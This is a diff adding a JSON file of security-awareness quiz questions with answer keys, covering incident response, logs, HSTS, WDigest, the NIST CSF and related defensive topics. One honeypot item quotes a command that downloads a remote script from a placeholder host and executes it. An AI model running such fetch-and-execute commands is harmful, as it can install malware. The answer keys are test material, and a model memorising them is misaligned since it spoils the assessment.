@@ -1,0 +1,266 @@
+[
+ {
+  "step": "audit",
+  "q": "You committed an API key by mistake and then deleted it in the next commit. What should you do?",
+  "options": [
+   "Nothing, it is gone",
+   "Rotate the key, because it is still in git history",
+   "Make the repository private only",
+   "Rename the file"
+  ],
+  "answer": 1,
+  "why": "Git keeps history. Anyone who can read the repo history can read the old key, so the key itself must be replaced."
+ },
+ {
+  "step": "logs",
+  "q": "A log shows 40 failed logins for one user from one address, then a success from the same address. What is the best reading?",
+  "options": [
+   "Normal behaviour",
+   "A possible brute-force that worked: check the account and reset it",
+   "A server bug",
+   "A DNS problem"
+  ],
+  "answer": 1,
+  "why": "Many failures followed by a success is a classic takeover pattern. It is a lead to investigate, not proof."
+ },
+ {
+  "step": "web",
+  "q": "Which header tells browsers to use HTTPS for future visits?",
+  "options": [
+   "X-Frame-Options",
+   "Strict-Transport-Security",
+   "Content-Type",
+   "Referer-Policy"
+  ],
+  "answer": 1,
+  "why": "HSTS stops downgrade attacks by making the browser refuse plain HTTP for that site."
+ },
+ {
+  "step": "ports",
+  "q": "Why should a database port not be open to the whole network?",
+  "options": [
+   "It slows the database",
+   "Anyone who can reach it can try to log in or exploit it",
+   "Ports use memory",
+   "It breaks backups"
+  ],
+  "answer": 1,
+  "why": "Every reachable service is attack surface. Bind to localhost or firewall it unless remote access is needed."
+ },
+ {
+  "step": "crypto",
+  "q": "What is the difference between hashing and encryption?",
+  "options": [
+   "None",
+   "A hash is one-way; encryption can be reversed with the key",
+   "Hashes are longer",
+   "Encryption is always slower"
+  ],
+  "answer": 1,
+  "why": "You can't recover the input from a hash. That is why passwords are stored as slow, salted hashes."
+ },
+ {
+  "step": "incident",
+  "q": "During an incident, what comes before cleaning up?",
+  "options": [
+   "Reboot everything",
+   "Contain it and preserve evidence and a timeline",
+   "Delete the logs",
+   "Tell no one"
+  ],
+  "answer": 1,
+  "why": "Cleaning first destroys the evidence you need to learn what happened and whether it is really over."
+ },
+ {
+  "step": "honeypot",
+  "q": "A honeypot log shows 'wget http://x.example/a.sh' followed by 'chmod +x a.sh; ./a.sh'. What do you do with the file?",
+  "options": [
+   "Run it in a VM to see what it does",
+   "Never run it; treat the URL and file as malicious and study them only in an isolated analysis setup",
+   "Open it on your laptop with antivirus on",
+   "Upload it to a friend"
+  ],
+  "answer": 1,
+  "why": "Downloads are real malware. Analysis belongs in an isolated, throwaway environment with no network path to anything you care about; for learning, read the commands instead."
+ },
+ {
+  "step": "honeypot",
+  "q": "All source addresses in your honeypot log start with 192.168. What does that tell you?",
+  "options": [
+   "You are being attacked from inside your building",
+   "It is your own lab traffic, not internet attackers",
+   "The honeypot is broken",
+   "These are the most dangerous sources"
+  ],
+  "answer": 1,
+  "why": "192.168.0.0/16 is private address space. Real internet attackers only appear if the honeypot is reachable from outside, which carries risk."
+ },
+ {
+  "step": "endpoint",
+  "q": "An audit shows WDigest UseLogonCredential = 1 on a workstation. Why does this matter?",
+  "options": [
+   "It slows logins",
+   "Clear-text passwords can be read from memory by credential-theft tools",
+   "It disables the firewall",
+   "It only affects old printers"
+  ],
+  "answer": 1,
+  "why": "With the value at 1, Windows caches reusable clear-text credentials in memory where tools such as Mimikatz can read them. Set it to 0 and alert if it changes."
+ },
+ {
+  "step": "endpoint",
+  "q": "You want to disable SMB1 across 400 PCs. What is the safe order?",
+  "options": [
+   "Disable everywhere tonight",
+   "Audit what uses it, pilot on a few PCs, deploy in phases with a backout plan",
+   "Disable it only on servers",
+   "Wait for Windows to remove it"
+  ],
+  "answer": 1,
+  "why": "Old scanners, NAS boxes and applications sometimes still use SMB1. Audit first, pilot, then phase the change in with a way back."
+ },
+ {
+  "step": "sec-principles",
+  "q": "A team hides its admin page at an odd URL and says nobody will find it. Which principle is this?",
+  "options": [
+   "Defense in depth",
+   "Security by obscurity, the anti-pattern",
+   "Least privilege",
+   "Separation of duties"
+  ],
+  "answer": 1,
+  "why": "Secrecy of the design is not access control. Add real authentication; an attacker only has to find the URL once."
+ },
+ {
+  "step": "sec-principles",
+  "q": "The same account raises a payment, approves it and audits it. What is missing?",
+  "options": [
+   "Separation of duties",
+   "Encryption",
+   "Availability",
+   "A longer password"
+  ],
+  "answer": 0,
+  "why": "No single person should control a whole sensitive process. Split request, approval and audit."
+ },
+ {
+  "step": "sec-principles",
+  "q": "A SYN flood fills the server's half-open connection table so real users cannot connect. Which CIA property is hit?",
+  "options": [
+   "Confidentiality",
+   "Integrity",
+   "Availability",
+   "Non-repudiation"
+  ],
+  "answer": 2,
+  "why": "Authorised users cannot use the service. Defences: SYN cookies, rate limiting, DDoS protection, capacity."
+ },
+ {
+  "step": "sec-principles",
+  "q": "Which pair of controls mainly protects integrity?",
+  "options": [
+   "Hashing and digital signatures",
+   "Backups and failover",
+   "Encryption and MFA",
+   "Firewalls and VLANs"
+  ],
+  "answer": 0,
+  "why": "Hashes, signatures and MACs let you detect that data was changed. Encryption mainly protects confidentiality; backups and failover protect availability."
+ },
+ {
+  "step": "sec-principles",
+  "q": "Kerckhoffs's principle says a cryptosystem should be secure if...",
+  "options": [
+   "Nobody knows the algorithm",
+   "Everything except the key is public",
+   "The key is short",
+   "It is written in-house"
+  ],
+  "answer": 1,
+  "why": "Only the key is the secret. A secret, home-made algorithm is a warning sign, not a strength."
+ },
+ {
+  "step": "sec-csf",
+  "q": "Your incident response plan belongs to which NIST CSF function?",
+  "options": [
+   "Identify",
+   "Protect",
+   "Respond",
+   "Govern"
+  ],
+  "answer": 2,
+  "why": "Responding is containing and communicating during an incident. Restoring service afterwards is Recover. (The source reading wrongly put incident plans under Identify.)"
+ },
+ {
+  "step": "sec-csf",
+  "q": "What did CSF 2.0 add to the original five functions?",
+  "options": [
+   "Govern",
+   "Audit",
+   "Encrypt",
+   "Isolate"
+  ],
+  "answer": 0,
+  "why": "Govern covers strategy, roles, policy, risk appetite and supply-chain risk."
+ },
+ {
+  "step": "sec-csf",
+  "q": "A restore test of your backups counts as which function?",
+  "options": [
+   "Detect",
+   "Recover",
+   "Identify",
+   "Protect"
+  ],
+  "answer": 1,
+  "why": "Proving you can restore is Recover. Taking the backup is partly Protect, but only a restore proves it works."
+ },
+ {
+  "step": "sec-csf",
+  "q": "Are the CSF functions steps to be completed in order?",
+  "options": [
+   "Yes, Identify first and Recover last",
+   "No, they run together and feed each other",
+   "Only for large companies",
+   "Only Protect is ongoing"
+  ],
+  "answer": 1,
+  "why": "It is a continuous cycle: lessons from Recover change Govern and Identify."
+ },
+ {
+  "step": "sec-tools",
+  "q": "You can read the claims inside a JWT without the secret. This means...",
+  "options": [
+   "The token is encrypted",
+   "Decoding proves nothing; only checking the signature does",
+   "The token is invalid",
+   "Only HS256 tokens can be read"
+  ],
+  "answer": 1,
+  "why": "The payload is only base64-encoded. The signature, checked by the server, is what shows it was not changed."
+ },
+ {
+  "step": "sec-tools",
+  "q": "A flaw has a CVSS base score of 9.8. For your organisation it is...",
+  "options": [
+   "Always critical",
+   "Severe in general; your risk also depends on exposure, exploits and asset value",
+   "Always low if internal",
+   "Impossible to judge"
+  ],
+  "answer": 1,
+  "why": "CVSS base rates the flaw itself. Exposure, exploit availability and what the system holds decide your risk."
+ },
+ {
+  "step": "sec-tools",
+  "q": "A playbook can isolate a host automatically. The safest design is...",
+  "options": [
+   "Always isolate on any alert",
+   "Isolate only after a person approves",
+   "Never gather information",
+   "Disable logging first"
+  ],
+  "answer": 1,
+  "why": "A wrong match would cut off a real system, so steps that remove access should wait for a human."
+ }
+]
